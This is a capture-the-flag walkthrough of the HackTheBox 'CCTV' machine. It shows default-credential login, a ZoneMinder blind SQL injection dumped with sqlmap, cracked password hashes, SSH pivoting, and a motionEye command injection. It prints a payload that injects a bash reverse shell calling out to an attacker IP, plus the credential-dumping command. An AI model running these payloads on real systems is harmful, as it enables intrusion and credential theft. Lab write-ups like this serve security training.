## Synopsis

**CCTV** is an easy-difficulty Linux machine on HackTheBox built around a real-world CCTV management stack. The machine hosts a **ZoneMinder** instance on port 80 and an internally exposed **motionEye** service on localhost. The attack path chains two CVEs: a blind SQL injection vulnerability [CVE-2024–51482](https://github.com/BridgerAlderson/CVE-2024-51482), in ZoneMinder to extract database credentials, followed by a command injection in a misconfigured motionEye instance running as root, resulting in full system compromise.

## Skills Required

- Web enumeration
- Understanding of CVEs and public vulnerability research

## Skills Learned

- Exploiting SQL Injection (Boolean-based blind SQLi) in ZoneMinder [CVE-2024–51482](https://github.com/BridgerAlderson/CVE-2024-51482),
- Credential extraction from database via SQL injection
- Port forwarding / internal service pivoting
- Command injection exploitation in motionEye
- Privilege escalation via misconfigured service running as root

### Enumeration

Starting enumeration with `nmap`.

```bash
sudo nmap -p- --open --min-rate 5000 -sS -Pn -sCV -n --disable-arp-ping --source-port 53 -oA target $ip
```
As an initial reconnaissance phase, a comprehensive scan of the $65,535$ TCP ports was performed using `Nmap` with a SYN scan (`-sS`). The goal was to identify the system’s open ports, detect the exact versions of the running services (`-sV`), and gather additional information by running the default NSE scripts (`-sC`). To optimize the process, a minimum rate of $5,000$ packets per second was configured, DNS resolution was disabled, and preliminary host discovery mechanisms were bypassed. The results were stored in multiple formats to facilitate subsequent analysis and provide a comprehensive view of the target’s attack surface.

![Nmap all ports scan](writeups/htb/src/cctv/CCTV_enumeraction_nmap.png)

After identifying the Virtual Host (VHost), we added it to the local host file `/etc/hosts` and accessed the website. At first glance, the page displayed seemingly normal content and did not reveal any interesting features. During the manual enumeration phase, we inspected the page's source code using **Ctrl + U** and found nothing significant—only the page's login form.

![Page Home](writeups/htb/src/cctv/CCTV_home.png)

![Page Login Botton](writeups/htb/src/cctv/CCTV_login_page.png)

When we clicked on the link, we encountered a login page that expanded the attack surface. At first, it seemed necessary to conduct further enumeration of the authentication mechanism, but after a quick review, we determined that the application was using default credentials, allowing us to access the dashboard without much difficulty.

![Login Page](writeups/htb/src/cctv/CCTV_login_page_panel.png)

```txt
user: admin
passowrd: admin
```

![Admin Panel](writeups/htb/src/cctv/CCTV_admin_panel.png)

After spending some time brute-forcing the enumeration without finding a clear way to exploit it, I began investigating the application version and found the exploit [CVE-2024–51482](https://github.com/BridgerAlderson/CVE-2024-51482), a **Boolean-Based SQL Injection** vulnerability affecting ZoneMinder versions 1.37 through 1.37.64. Upon analyzing the exploit and understanding how the vulnerability worked, I observed that it was possible to extract information from the database using Boolean queries, which provided us with a new avenue to continue exploiting the system.

![Found CVE](writeups/htb/src/cctv/CCTV_found_CVE.png)

After conducting the necessary tests, it was confirmed that the *PoC* worked correctly on the target, validating the presence of the vulnerability.

![Vulnerability Test](writeups/htb/src/cctv/CCTV_vulnerability_test.png)

Once the vulnerability was confirmed, and to avoid spending time developing a custom script or adapting the *PoC* to automate data extraction, I chose to use `SQLMap`. This tool allowed me to efficiently exploit the SQL injection, facilitating database enumeration and the retrieval of relevant information to continue compromising the system.

```shell
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
-D zm -T Users -C Username,Password \
--dump --batch --dbms=MySQL \
--cookie="ZMSESSID=<your_id>"
```

![SQLMAP Exploit](writeups/htb/src/cctv/CCTV_exploit_with_sqlmap.png)

![SQLMAP Password](writeups/htb/src/cctv/CCTV_exploit_with_sqlmap_password.png)


| Username   | Password                                                     |
|------------|--------------------------------------------------------------|
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |

After extracting the hashes, I used **John the Ripper** with a password dictionary to try to crack them; several of the hashes were successfully cracked, allowing me to obtain plaintext credentials and continue with the system enumeration.

![John Cracking](writeups/htb/src/cctv/CCTV_john_cracking.png)

```txt
mark:opensesame
admin:admin
```

### Foothold

After completing the enumeration phase and recovering a valid password, the next step was to attempt access to the system via `SSH`. To do this, I tested the obtained credentials against the different users identified during enumeration, until finding a valid combination that allowed access to the server.

```shell
ssh mark@cctv.htb
```

![SSH Connect](writeups/htb/src/cctv/CCTV_ssh_connect.png)

After gaining access as `mark`, I performed a new local enumeration phase. Although no obvious escalation vectors were found, several services were listening exclusively on localhost. Port 8765 caught my attention, so I investigated the associated application and its configuration files. During this review, I found credentials stored in the `motion.conf` service configuration, which provided a new path to advance the system compromise.

```shell
ss -nlta
```

![Local Ports](writeups/htb/src/cctv/CCTV_local_port_config.png)

After identifying the application associated with port 8765 and obtaining valid credentials, I closed the current session and established an SSH tunnel via port forwarding to expose the local `127.0.0.1:8765` service on our attacking machine. This allows accessing and interacting with the application from the browser as if it were externally exposed.

```shell
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

![Port Forwarding](writeups/htb/src/cctv/CCTV_port_forwarding.png)

## Privilege Escalation

Once the port forwarding was correctly established, I accessed the application from my browser using the redirected port. I then logged in with the credentials previously found in the `config.conf` file, successfully gaining access to the application panel.

![Login Panel Cam](writeups/htb/src/cctv/CCTV_login_cctv.png)
![Panel Cam](writeups/htb/src/cctv/CCTV_login_cctv_panel.png)

After exploring the application for a while to better understand its functionality, I investigated potential vulnerabilities associated with the version in use. During this search I found the vulnerability [CVE-2025-60787](https://github.com/advisories/GHSA-j945-qm58-4gjx) and located a public PoC that could be used to exploit the service and continue with the escalation process.

![New CVE](writeups/htb/src/cctv/CCTV_new_cve.png)

Following the provided instructions for its execution, before launching the exploit, configure a `Netcat` listener on the attacking machine to receive the incoming connection. After executing the exploit, a reverse shell from the target system was successfully obtained.

```shell
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/192.168.0.108/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

![Exploit New CVE](writeups/htb/src/cctv/CCTV_exploit_cve_rev.png)

With this, the machine was successfully completed and access to the corresponding flags was obtained. However, during the process the user flag was not found, so I decided to perform an additional search to locate it. It is possible that an alternative exploitation path existed or some enumeration step was overlooked during the initial system compromise.

```shell
find / -name "user.txt" 2>/dev/null
```

![Flags](writeups/htb/src/cctv/CCTV_flags.png)
